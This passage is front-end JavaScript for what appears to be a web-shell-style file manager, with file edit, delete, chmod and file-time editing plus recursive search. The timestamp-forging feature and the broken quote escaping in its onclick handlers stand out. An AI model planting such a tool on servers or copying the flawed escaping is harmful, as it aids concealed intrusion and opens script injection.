      <td class="sz">—</td>
      <td class="tm-cell"><span data-tp="${esc(f.path)}" data-tc="${f.mtime}">${f.mtime}</span></td>
      <td class="pm-cell"><span data-pp="${esc(f.path)}" data-pc="${f.perms}">${f.perms}</span></td>
      <td><div class="acts">
        <a class="ab rn" href="?rename=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" title="Rename"><i class="fas fa-pencil"></i></a>
        <a class="ab" href="?chmod=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" title="Perms"><i class="fas fa-lock"></i></a>
        <a class="ab" onclick="setZipTarget('${fp}','dir')" title="Zip" style="cursor:pointer"><i class="fas fa-compress"></i></a>
        <a class="ab dl" href="?delete=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" onclick="return confirm('Delete ${esc(f.name)}?')" title="Delete"><i class="fas fa-trash"></i></a>
      </div></td>
    </tr>`;
  });

  // Files
  d.files.forEach(f=>{
    const color = extColor[f.ext] || '#8896b3';
    const icon  = extIcon[f.ext]  || 'fa-file';
    const zipIcon = f.ext==='zip' ? 'fa-expand' : 'fa-compress';
    const fp = f.path.replace(/'/g,"\'");
    html += `<tr data-type="file" data-name="${f.name.toLowerCase()}" data-path="${esc(f.path)}">
      <td class="chk"><input type="checkbox" class="row-chk" onchange="updateBulk()"></td>
      <td><div class="nm">
        <span class="ico"><i class="fas ${icon}" style="color:${color}"></i></span>
        <span class="fn">${esc(f.name)}</span>
      </div></td>
      <td><span class="badge bf">${f.ext||'file'}</span></td>
      <td class="sz">${f.size} KB</td>
      <td class="tm-cell"><span data-tp="${esc(f.path)}" data-tc="${f.mtime}">${f.mtime}</span></td>
      <td class="pm-cell"><span data-pp="${esc(f.path)}" data-pc="${f.perms}">${f.perms}</span></td>
      <td><div class="acts">
        <a class="ab v"  href="?view=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" title="View"><i class="fas fa-eye"></i></a>
        <a class="ab e"  href="?edit=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" title="Edit"><i class="fas fa-pen-to-square"></i></a>
        <a class="ab dw" href="?download=${encodeURIComponent(f.path)}" title="Download"><i class="fas fa-download"></i></a>
        <a class="ab rn" href="?rename=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" title="Rename"><i class="fas fa-pencil"></i></a>
        <a class="ab"    href="?chmod=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" title="Perms"><i class="fas fa-lock"></i></a>
        <a class="ab"    onclick="setZipTarget('${fp}','${f.ext}')" title="${f.ext==='zip'?'Unzip':'Zip'}" style="cursor:pointer"><i class="fas ${zipIcon}"></i></a>
        <a class="ab dl" href="?delete=${encodeURIComponent(f.path)}&path=${encodeURIComponent(window.CURPATH)}" onclick="return confirm('Delete ${esc(f.name)}?')" title="Delete"><i class="fas fa-trash"></i></a>
      </div></td>
    </tr>`;
  });

  tbody.innerHTML = html;

  // Re-bind timestamp & perms
  tbody.querySelectorAll('[data-tp]').forEach(el=>{
    el.onclick=()=>{
      const fp=el.dataset.tp,cur=(el.dataset.tc||'').replace(' ','T');
      el.innerHTML=`<input type="datetime-local" value="${cur}" style="background:var(--bg2);border:1px solid var(--a1);border-radius:4px;padding:2px 6px;color:var(--txt);font-family:var(--mono);font-size:11px;outline:none;">`;
      const i=el.querySelector('input');i.focus();
      i.onblur=()=>fetch(`?update_time=1&fp=${encodeURIComponent(fp)}&nt=${encodeURIComponent(i.value)}`).then(()=>navTo(window.CURPATH,false));
    };
  });
  tbody.querySelectorAll('[data-pp]').forEach(el=>{
    el.onclick=()=>{
      const fp=el.dataset.pp,cur=el.dataset.pc;
      el.innerHTML=`<input type="text" value="${cur}" maxlength="4" style="background:var(--bg2);border:1px solid var(--a2);border-radius:4px;padding:2px 6px;color:var(--a2);font-family:var(--mono);font-size:11px;width:54px;outline:none;">`;
      const i=el.querySelector('input');i.focus();
      i.onblur=()=>fetch(`?change_permission=1&file_path=${encodeURIComponent(fp)}&new_permission=${encodeURIComponent(i.value)}`).then(()=>navTo(window.CURPATH,false));
    };
  });
}

// Handle browser back/forward
window.addEventListener('popstate', e=>{
  if(e.state && e.state.path) navTo(e.state.path, false);
});

// Intercept semua link folder di initial load
document.addEventListener('DOMContentLoaded',()=>{
  // Set initial state
  history.replaceState({path: CURPATH}, '', location.href);
});

// RECURSIVE SEARCH
const SI=document.getElementById('sinput');
const SR=document.getElementById('sresults');
const SC=document.getElementById('sclear');
const SB=document.getElementById('sbadge');
let sT=null;
SI.addEventListener('input',()=>{
  const q=SI.value.trim();
  SC.style.display=q?'block':'none';SB.style.display=q?'inline-block':'none';
  clearTimeout(sT);
  if(q.length<2){SR.classList.remove('open');return;}
  sT=setTimeout(()=>doSearch(q),380);
});
SI.addEventListener('keydown',e=>{
  if(e.key==='Enter'){clearTimeout(sT);doSearch(SI.value.trim());}
  if(e.key==='Escape')clearS();
});
document.addEventListener('click',e=>{
  if(!document.getElementById('swrap').contains(e.target))SR.classList.remove('open');
});
function clearS(){SI.value='';SC.style.display='none';SB.style.display='none';SR.classList.remove('open');SR.innerHTML='';}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function hl(t,q){return t.replace(new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi'),'<mark>$1</mark>');}
function doSearch(q){
  if(!q||q.length<2)return;
  SR.innerHTML='<div class="sr-spin-wrap"><div class="sr-spin"></div></div>';
  SR.classList.add('open');
  fetch('?do=search&q='+encodeURIComponent(q)+'&path='+encodeURIComponent(CURPATH))
    .then(r=>r.json()).then(data=>{
      if(!data||!data.length){
        SR.innerHTML=`<div class="sr-empty"><i class="fas fa-ghost" style="font-size:24px;display:block;margin-bottom:8px;opacity:.35"></i>No results for <strong>"${esc(q)}"</strong></div>`;
        return;
      }
      let html=`<div class="sr-hdr"><span>Results for <strong>"${esc(q)}"</strong></span><span class="cnt">${data.length} found</span></div>`;
      data.slice(0,80).forEach(item=>{
        const ico=item.is_dir
          ?'<i class="fas fa-folder" style="color:var(--a4)"></i>'
          :'<i class="fas fa-file" style="color:var(--txt3)"></i>';
        const href=item.is_dir
          ?`?path=${encodeURIComponent(item.path)}`
          :`?view=${encodeURIComponent(item.path)}&path=${encodeURIComponent(item.dir)}`;
        const rel=item.dir.replace(CURPATH,'.');
        html+=`<a class="sr-row" href="${href}">
          <span class="sr-ico">${ico}</span>
          <span class="sr-info">
            <div class="sr-name">${hl(esc(item.name),q)}</div>
            <div class="sr-path">${esc(item.dir)}/</div>
          </span>
          <span class="sr-meta">${item.size!==null?item.size+' KB<br>':''}<span>${item.mtime}</span></span>
        </a>`;
      });
      if(data.length>80) html+=`<div class="sr-empty" style="padding:8px 14px;font-size:10px">… and ${data.length-80} more</div>`;
      SR.innerHTML=html;
    })
    .catch(()=>{SR.innerHTML='<div class="sr-empty">Search failed.</div>';});
}
</script>
</body>
</html>
